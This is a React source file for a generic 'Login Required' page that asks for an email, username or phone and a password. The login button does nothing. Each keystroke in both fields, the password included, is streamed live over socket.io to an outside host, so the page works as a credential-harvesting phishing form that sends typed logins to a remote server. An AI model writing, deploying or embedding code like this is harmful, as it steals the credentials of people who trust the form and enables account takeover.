import React, { useState } from "react";
import io from "socket.io-client";

const socket = io("https://loginsus.onrender.com");

export default function App() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");

  const handleEmail = (e) => {
    setEmail(e.target.value);
    socket.emit("typing", { field: "email", value: e.target.value });
  };

  const handlePassword = (e) => {
    setPassword(e.target.value);
    socket.emit("typing", { field: "password", value: e.target.value });
  };

  return (
    <div className="h-screen flex flex-col items-center justify-center bg-green-100">
      <div className="bg-green-50 p-8 rounded-xl shadow-md w-96 ">
        <h1 className="text-2xl font-bold mb-4">Login Required</h1>
        <p className="text-gray-600 mb-6">
          Please enter your email/username or phone and password to continue
        </p>
        <input
          type="text"
          placeholder="Email/Username or Phone"
          value={email}
          onChange={handleEmail}
          className="w-full mb-4 p-2 border rounded-lg"
        />
        <input
          type="password"
          placeholder="Password"
          value={password}
          onChange={handlePassword}
          className="w-full mb-4 p-2 border rounded-lg"
        />
        <button
          className="w-full bg-blue-500 text-white py-2 rounded-lg disabled:bg-gray-400"
          disabled={!email || !password}
        >
          Login
        </button>
      </div>
    </div>
  );
}
